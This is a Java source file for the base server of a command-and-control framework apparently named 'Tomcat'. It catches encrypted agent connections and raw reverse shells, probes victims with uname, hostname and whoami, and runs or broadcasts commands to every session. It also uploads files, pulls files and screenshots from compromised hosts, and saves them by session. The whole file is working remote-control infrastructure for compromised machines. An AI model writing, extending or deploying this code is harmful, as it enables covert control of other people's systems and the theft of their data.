package com.tomcat.core.server;

import com.google.gson.Gson;
import com.tomcat.core.crypto.SymmetricCrypto;
import com.tomcat.core.event.EventManager;
import com.tomcat.core.event.EventManager.EventType;
import com.tomcat.core.output.Logger;
import com.tomcat.core.session.Session;
import com.tomcat.core.session.SessionManager;
import com.tomcat.utils.ServerConfig;
import java.io.*;
import java.net.Socket;
import java.nio.file.*;
import java.util.*;
import java.util.concurrent.*;

public abstract class BaseServer {

    protected static final byte[] EndMarker = "<END>".getBytes();
    protected static final byte[] MetaMarker = "<META>".getBytes();
    protected static final Gson Gson = new Gson();
    protected static final int MinFrameBytes = 12 + 16;

    private static final int PeekWindow = 16;
    private static final long PeekTimeout = 2000;
    private static final int RawIdleMs = 800;
    private static final int RawMaxWaitMs = 30_000;
    private static final String AnsiStripPattern = "\u001B\\[[;\\d]*[A-Za-z]|\u001B\\[\\?[\\d]+[hl]|\u001B=[><]";

    protected final String Host;
    protected final int Port;
    protected final ListenerMode Mode;
    protected final ServerConfig Config;
    protected final SessionManager Sessions;
    protected final EventManager Events;
    protected volatile boolean Running;

    // Per-session crypto — KEY FIX: was a single shared Crypto field before
    protected final ConcurrentHashMap<Integer, SymmetricCrypto> SessionCryptos = new ConcurrentHashMap<>();
    protected final ConcurrentHashMap<Integer, Object> CommandLocks = new ConcurrentHashMap<>();

    protected BaseServer(String Host, int Port, ListenerMode Mode, ServerConfig Config) {
        this.Host = Host;
        this.Port = Port;
        this.Mode = Mode;
        this.Config = Config;
        this.Sessions = new SessionManager();
        this.Events = new EventManager();
    }

    protected SymmetricCrypto NewSessionCrypto() throws Exception {
        SymmetricCrypto C = new SymmetricCrypto();
        C.GenerateKey();
        return C;
    }

    public abstract boolean[] StartServer();

    public abstract void StopServer();

    public abstract void AcceptConnections();

    public void AddEventListener(EventManager.EventListener Listener) {
        Events.AddListener(Listener);
    }

    public enum ConnectionType {
        TOMCAT,
        RAW,
        HTTP,
        UNKNOWN,
    }

    public static final class DetectionResult {

        public final ConnectionType Type;
        public final PushbackInputStream Stream;
        public final byte[] Peeked;

        DetectionResult(ConnectionType T, PushbackInputStream S, byte[] P) {
            Type = T;
            Stream = S;
            Peeked = P;
        }
    }

    protected DetectionResult Detect(Socket Sock) throws IOException {
        Sock.setSoTimeout((int) PeekTimeout);
        PushbackInputStream PbIn = new PushbackInputStream(Sock.getInputStream(), 512);
        byte[] Peek = new byte[PeekWindow];
        int Read = 0;
        long Dead = System.currentTimeMillis() + PeekTimeout;
        try {
            while (Read < PeekWindow && System.currentTimeMillis() < Dead) {
                int B = PbIn.read();
                if (B == -1) break;
                Peek[Read++] = (byte) B;
            }
        } catch (java.net.SocketTimeoutException Ignored) {} finally {
            Sock.setSoTimeout(0);
        }
        if (Read == 0) return new DetectionResult(ConnectionType.UNKNOWN, PbIn, new byte[0]);
        PbIn.unread(Peek, 0, Read);
        byte[] P = Arrays.copyOf(Peek, Read);
        String Str = new String(P, "UTF-8").trim();
        ConnectionType Type;
        if (Str.startsWith("{")) Type = ConnectionType.TOMCAT;
        else if (
            Str.startsWith("GET ") || Str.startsWith("POST ") || Str.startsWith("PUT ") || Str.startsWith("HEAD ")
        ) Type = ConnectionType.HTTP;
        else Type = ConnectionType.RAW;
        Logger.Verbose(
            "Detect [" +
            Sock.getRemoteSocketAddress() +
            "] → " +
            Type +
            " peek=" +
            Str.substring(0, Math.min(Str.length(), 12))
        );
        return new DetectionResult(Type, PbIn, P);
    }

    // Takes SymmetricCrypto as param — uses per-session key
    protected Map<String, Object> TomcatHandshake(
        InputStream In,
        OutputStream Out,
        int TimeoutMs,
        SymmetricCrypto Crypto
    ) throws Exception {
        ByteArrayOutputStream Buf = new ByteArrayOutputStream();
        long Dead = System.currentTimeMillis() + TimeoutMs;
        int Depth = 0;
        boolean InStr = false, Esc = false, Started = false;

        while (System.currentTimeMillis() < Dead) {
            if (In.available() > 0) {
                int B = In.read();
                if (B == -1) break;
                Buf.write(B);
                char Ch = (char) B;
                if (Esc) Esc = false;
                else if (Ch == '\\' && InStr) Esc = true;
                else if (Ch == '"') InStr = !InStr;
                else if (!InStr) {
                    if (Ch == '{') {
                        Depth++;
                        Started = true;
                    } else if (Ch == '}') Depth--;
                }
                if (Started && Depth == 0) break;
            } else {
                Thread.sleep(30);
            }
        }

        String Json = Buf.toString("UTF-8").trim();
        if (!Json.startsWith("{")) throw new IOException(
            "Expected JSON sysinfo, got: " + (Json.length() > 64 ? Json.substring(0, 64) + "…" : Json)
        );

        @SuppressWarnings("unchecked")
        Map<String, Object> Info = Gson.fromJson(Json, Map.class);
        for (String F : new String[] { "os", "hostname", "user" }) {
            if (!Info.containsKey(F) || Info.get(F) == null) throw new IOException(
                "Agent JSON missing required field: " + F
            );
        }

        Out.write((Crypto.GetKeyAsBase64Url() + "\n").getBytes("UTF-8"));
        Out.flush();
        Logger.Verbose(
            "TOMCAT handshake OK — " + Info.get("hostname") + " key=" + Crypto.GetKeyAsBase64Url().substring(0, 8) + "…"
        );
        return Info;
    }

    protected Map<String, Object> RawHandshake(InputStream In, OutputStream Out, String RemoteAddr) throws Exception {
        Map<String, Object> Info = new LinkedHashMap<>();
        Info.put("os", "Unknown");
        Info.put("hostname", "Unknown");
        Info.put("user", "Unknown");
        Info.put("architecture", "Unknown");
        Info.put("agentip", RemoteAddr.replaceAll("/|:.*", ""));
        Info.put("shellmode", "Raw");

        String Probe =
            "echo TCID:$(uname -s 2>/dev/null || echo WIN):" +
            "$(hostname 2>/dev/null):$(whoami 2>/dev/null):$(uname -m 2>/dev/null)\n";
        try {
            Out.write(Probe.getBytes("UTF-8"));
            Out.flush();
            StringBuilder Resp = new StringBuilder();
            long Dead = System.currentTimeMillis() + 4000;
            while (System.currentTimeMillis() < Dead) {
                if (In.available() > 0) {
                    Resp.append((char) In.read());
                    int Idx = Resp.indexOf("TCID:");
                    if (Idx >= 0) {
                        int End = Resp.indexOf("\n", Idx);
                        if (End > 0) {
                            String Line = StripAnsi(Resp.substring(Idx + 5, End).trim());
                            String[] Parts = Line.split(":", -1);
                            if (Parts.length >= 4) {
                                if (!Parts[0].isEmpty()) Info.put("os", Parts[0]);
                                if (!Parts[1].isEmpty()) Info.put("hostname", Parts[1]);
                                if (!Parts[2].isEmpty()) Info.put("user", Parts[2]);
                                if (!Parts[3].isEmpty()) Info.put("architecture", Parts[3]);
                            }
                            break;
                        }
                    }
                } else {
                    Thread.sleep(50);
                }
            }
        } catch (Exception E) {
            Logger.Warn("Raw probe failed (session still registered): " + E.getMessage());
        }
        Logger.Verbose("Raw handshake — host=" + Info.get("hostname") + " os=" + Info.get("os"));
        return Info;
    }

    protected void MonitorSession(int SessionId, Socket Sock, boolean IsRaw) {
        try {
            Sock.setKeepAlive(true);
        } catch (Exception Ignored) {}

        Thread T = new Thread(
            () -> {
                while (Running && Sessions.Exists(SessionId)) {
                    try {
                        Thread.sleep(20_000);
                        if (!Running || !Sessions.Exists(SessionId)) break;
                        if (Sock.isClosed() || !Sock.isConnected() || Sock.isOutputShutdown()) throw new IOException(
                            "Socket closed"
                        );

                        if (!IsRaw) {
                            Object Lock = CommandLocks.get(SessionId);
                            if (Lock == null) break;
                            synchronized (Lock) {
                                SymmetricCrypto Crypto = SessionCryptos.get(SessionId);
                                if (Crypto == null) break;
                                try {
                                    byte[] Ping = Crypto.Encrypt("__PING__".getBytes("UTF-8"));
                                    Sock.getOutputStream().write(Ping);
                                    Sock.getOutputStream().flush();
                                } catch (Exception E) {
                                    throw new IOException("Heartbeat failed: " + E.getMessage());
                                }
                            }
                        }
                    } catch (InterruptedException E) {
                        Thread.currentThread().interrupt();
                        break;
                    } catch (Exception E) {
                        Logger.Verbose("Session-" + SessionId + " disconnected: " + E.getMessage());
                        Events.Trigger(
                            EventType.AgentDisconnected,
                            EventManager.BuildData("ID", SessionId, "Reason", E.getMessage())
                        );
                        RemoveSession(SessionId);
                        break;
                    }
                }
            },
            "Monitor-" + SessionId
        );
        T.setDaemon(true);
        T.start();
    }

    public String[] ExecuteCommand(int SessionId, String Command) {
        Optional<Session> Opt = Sessions.Get(SessionId);
        if (Opt.isEmpty()) return Fail("Session not found");
        Session S = Opt.get();
        Object Lck = CommandLocks.get(SessionId);
        if (Lck == null) return Fail("Session lock missing");

        synchronized (Lck) {
            try {
                String Cmd = Command.trim();
                if (Cmd.isEmpty()) return Fail("Empty command");
                String CmdLow = Cmd.toLowerCase();

                if (CmdLow.startsWith("upload")) return HandleUpload(S, Cmd);
                if (
                    CmdLow.startsWith("download") || CmdLow.startsWith("dl ") || CmdLow.startsWith("screenshot")
                ) return S.IsRawMode() ? Fail("Not supported in raw mode") : SendThenDownload(S, Cmd);

                if (S.IsRawMode()) {
                    S.GetSocket().getOutputStream().write((Cmd + "\n").getBytes("UTF-8"));
                    S.GetSocket().getOutputStream().flush();
                    byte[] Resp = ReadRawResponse(S.GetSocket());
                    if (Resp == null || Resp.length == 0) return Fail("No response");
                    return new String[] { "true", StripAnsi(new String(Resp, "UTF-8")) };
                } else {
                    SymmetricCrypto Crypto = SessionCryptos.get(SessionId);
                    if (Crypto == null) return Fail("Session crypto missing");
                    byte[] Enc = Crypto.Encrypt(Cmd.getBytes("UTF-8"));
                    S.GetSocket().getOutputStream().write(Enc);
                    S.GetSocket().getOutputStream().flush();
                    byte[] Resp = ReadResponse(S.GetSocket(), Config.GetCommandTimeout());
                    if (Resp == null || Resp.length == 0) return Fail("No response from agent");
                    return new String[] { "true", Crypto.DecryptString(Resp) };
                }
            } catch (Exception E) {
                Logger.Error("Command error session-" + SessionId + ": " + E.getMessage());
                RemoveSession(SessionId);
                return Fail("Error: " + E.getMessage());
            }
        }
    }

    public Map<Integer, String[]> BroadcastCommand(List<Integer> SessionIds, String Command) {
        Map<Integer, String[]> Results = new ConcurrentHashMap<>();
        List<CompletableFuture<Void>> Futures = new ArrayList<>();
        for (int Id : SessionIds) {
            CompletableFuture<Void> F = CompletableFuture.runAsync(() -> Results.put(Id, ExecuteCommand(Id, Command)));
            Futures.add(F);
        }
        try {
            CompletableFuture.allOf(Futures.toArray(new CompletableFuture[0])).get(
                Config.GetCommandTimeout() + 5000,
                TimeUnit.MILLISECONDS
            );
        } catch (Exception E) {
            Logger.Warn("Broadcast partial timeout: " + E.getMessage());
        }
        return Results;
    }

    public Map<Integer, String[]> BroadcastAll(String Command) {
        List<Integer> Ids = new ArrayList<>();
        Sessions.GetAll().forEach(S -> Ids.add(S.GetId()));
        return BroadcastCommand(Ids, Command);
    }

    protected byte[] ReadRawResponse(Socket Sock) throws IOException {
        Sock.setSoTimeout(RawIdleMs);
        ByteArrayOutputStream Buf = new ByteArrayOutputStream();
        byte[] Tmp = new byte[Config.GetBufferSize()];
        long Dead = System.currentTimeMillis() + RawMaxWaitMs;
        while (System.currentTimeMillis() < Dead) {
            int N;
            try {
                N = Sock.getInputStream().read(Tmp);
            } catch (java.net.SocketTimeoutException E) {
                if (Buf.size() > 0) break;
                continue;
            }
            if (N == -1) break;
            Buf.write(Tmp, 0, N);
        }
        Sock.setSoTimeout(0);
        return Buf.size() > 0 ? Buf.toByteArray() : null;
    }

    protected byte[] ReadResponse(Socket Sock, int TimeoutMs) throws IOException {
        Sock.setSoTimeout(TimeoutMs);
        ByteArrayOutputStream Buf = new ByteArrayOutputStream();
        byte[] Tmp = new byte[Config.GetBufferSize()];
        long Dead = System.currentTimeMillis() + TimeoutMs;

        while (System.currentTimeMillis() < Dead) {
            int N;
            try {
                N = Sock.getInputStream().read(Tmp);
            } catch (java.net.SocketTimeoutException E) {
                break;
            }
            if (N == -1) break;
            Buf.write(Tmp, 0, N);
            byte[] Cur = Buf.toByteArray();
            if (Cur.length >= MinFrameBytes && EndsWith(Cur, EndMarker)) return Arrays.copyOf(
                Cur,
                Cur.length - EndMarker.length
            );
        }
        Sock.setSoTimeout(0);
        byte[] Final = Buf.toByteArray();
        if (Final.length >= MinFrameBytes && EndsWith(Final, EndMarker)) return Arrays.copyOf(
            Final,
            Final.length - EndMarker.length
        );
        return Final.length > 0 ? Final : null;
    }

    private String[] HandleUpload(Session S, String Command) {
        if (S.IsRawMode()) return Fail("Upload unsupported in raw mode");
        SymmetricCrypto Crypto = SessionCryptos.get(S.GetId());
        if (Crypto == null) return Fail("Session crypto missing");
        String[] Parts = Command.split("\\s+", 3);
        if (Parts.length < 2) return Fail("Usage: upload <local> [remote]");
        String Local = Parts[1];
        String Remote = Parts.length > 2 ? Parts[2] : "";
        if (!Files.exists(Paths.get(Local))) return Fail("File not found: " + Local);
        try {
            String Name = Paths.get(Local).getFileName().toString();
            byte[] Enc = Crypto.Encrypt((Remote.isEmpty() ? "upload " + Name : "upload " + Remote).getBytes("UTF-8"));
            OutputStream Out = S.GetSocket().getOutputStream();
            Out.write(Enc);
            Out.flush();
            Thread.sleep(300);
            byte[] Data = Files.readAllBytes(Paths.get(Local));
            Map<String, Object> Meta = new LinkedHashMap<>();
            Meta.put("type", "file");
            Meta.put("filename", Name);
            Meta.put("size", Data.length);
            byte[] MetaEnc = Crypto.Encrypt(Gson.toJson(Meta).getBytes("UTF-8"));
            Out.write(MetaEnc);
            Out.write(MetaMarker);
            Out.flush();
            Thread.sleep(100);
            Out.write(Data);
            Out.write(EndMarker);
            Out.flush();
            return new String[] { "true", "Uploaded: " + Name };
        } catch (Exception E) {
            return Fail("Upload error: " + E.getMessage());
        }
    }

    private String[] SendThenDownload(Session S, String Command) {
        SymmetricCrypto Crypto = SessionCryptos.get(S.GetId());
        if (Crypto == null) return Fail("Session crypto missing");
        try {
            byte[] Enc = Crypto.Encrypt(Command.getBytes("UTF-8"));
            S.GetSocket().getOutputStream().write(Enc);
            S.GetSocket().getOutputStream().flush();
            return HandleDownload(S, Crypto);
        } catch (Exception E) {
            return Fail("Send error: " + E.getMessage());
        }
    }

    private String[] HandleDownload(Session S, SymmetricCrypto Crypto) {
        try {
            ByteArrayOutputStream Buf = new ByteArrayOutputStream();
            byte[] Tmp = new byte[Config.GetBufferSize()];
            S.GetSocket().setSoTimeout(30_000);
            while (true) {
                int N;
                try {
                    N = S.GetSocket().getInputStream().read(Tmp);
                } catch (java.net.SocketTimeoutException E) {
                    break;
                }
                if (N == -1) break;
                Buf.write(Tmp, 0, N);
                byte[] Cur = Buf.toByteArray();
                if (ContainsMarker(Cur, MetaMarker) || EndsWith(Cur, EndMarker)) break;
            }
            S.GetSocket().setSoTimeout(0);
            byte[] Data = Buf.toByteArray();
            int MetaIdx = IndexOf(Data, MetaMarker);
            if (MetaIdx >= 0) {
                byte[] MetaRaw = Arrays.copyOf(Data, MetaIdx);
                byte[] Rest = Arrays.copyOfRange(Data, MetaIdx + MetaMarker.length, Data.length);
                @SuppressWarnings("unchecked")
                Map<String, Object> Meta = Gson.fromJson(Crypto.DecryptString(MetaRaw), Map.class);
                String Filename = (String) Meta.getOrDefault("filename", "received_file");
                ByteArrayOutputStream FileBuf = new ByteArrayOutputStream();
                FileBuf.write(Rest);
                S.GetSocket().setSoTimeout(30_000);
                while (!EndsWith(FileBuf.toByteArray(), EndMarker)) {
                    int N;
                    try {
                        N = S.GetSocket().getInputStream().read(Tmp);
                    } catch (java.net.SocketTimeoutException E) {
                        break;
                    }
                    if (N == -1) break;
                    FileBuf.write(Tmp, 0, N);
                }
                S.GetSocket().setSoTimeout(0);
                byte[] FileData = FileBuf.toByteArray();
                if (EndsWith(FileData, EndMarker)) FileData = Arrays.copyOf(
                    FileData,
                    FileData.length - EndMarker.length
                );
                String Saved = SaveFile(Filename, FileData, S.GetId());
                return Saved != null ? new String[] { "true", "Saved: " + Saved } : Fail("Failed to save file");
            }
            if (EndsWith(Data, EndMarker)) Data = Arrays.copyOf(Data, Data.length - EndMarker.length);
            return new String[] { "true", Crypto.DecryptString(Data) };
        } catch (Exception E) {
            return Fail("Download error: " + E.getMessage());
        }
    }

    protected String SaveFile(String Filename, byte[] Data, int SessionId) {
        try {
            Path Dir = Paths.get("Downloads/Session_" + SessionId);
            Files.createDirectories(Dir);
            String Base = Filename, Ext = "";
            int Dot = Filename.lastIndexOf('.');
            if (Dot > 0) {
                Base = Filename.substring(0, Dot);
                Ext = Filename.substring(Dot);
            }
            Path Target = Dir.resolve(Filename);
            for (int I = 1; Files.exists(Target); I++) Target = Dir.resolve(Base + "_" + I + Ext);
            Files.write(Target, Data);
            return Target.toString();
        } catch (IOException E) {
            Logger.Error("SaveFile failed: " + E.getMessage());
            return null;
        }
    }

    private static String StripAnsi(String Input) {
        return Input.replaceAll(AnsiStripPattern, "").trim();
    }

    public void RemoveSession(int SessionId) {
        Sessions.Remove(SessionId);
        CommandLocks.remove(SessionId);
        SessionCryptos.remove(SessionId);
        Events.Trigger(EventType.AgentRemoved, EventManager.BuildData("ID", SessionId));
    }

    // Kept for WebApp/CLI compatibility — returns key of first session or placeholder
    public String GetKeyBase64() {
        if (SessionCryptos.isEmpty()) return "(no active sessions)";
        return SessionCryptos.values().iterator().next().GetKeyAsBase64Url();
    }

    public SymmetricCrypto GetSessionCrypto(int SessionId) {
        return SessionCryptos.get(SessionId);
    }

    public SessionManager GetSessions() {
        return Sessions;
    }

    public EventManager GetEvents() {
        return Events;
    }

    public ListenerMode GetMode() {
        return Mode;
    }

    public String GetHost() {
        return Host;
    }

    public int GetPort() {
        return Port;
    }

    public boolean IsRunning() {
        return Running;
    }

    protected static String[] Fail(String Msg) {
        return new String[] { "false", Msg };
    }

    protected boolean EndsWith(byte[] Data, byte[] Suffix) {
        if (Data.length < Suffix.length) return false;
        for (int I = 0; I < Suffix.length; I++) if (Data[Data.length - Suffix.length + I] != Suffix[I]) return false;
        return true;
    }

    protected boolean ContainsMarker(byte[] Data, byte[] Marker) {
        return IndexOf(Data, Marker) >= 0;
    }

    protected int IndexOf(byte[] Data, byte[] Pat) {
        outer: for (int I = 0; I <= Data.length - Pat.length; I++) {
            for (int J = 0; J < Pat.length; J++) if (Data[I + J] != Pat[J]) continue outer;
            return I;
        }
        return -1;
    }
}
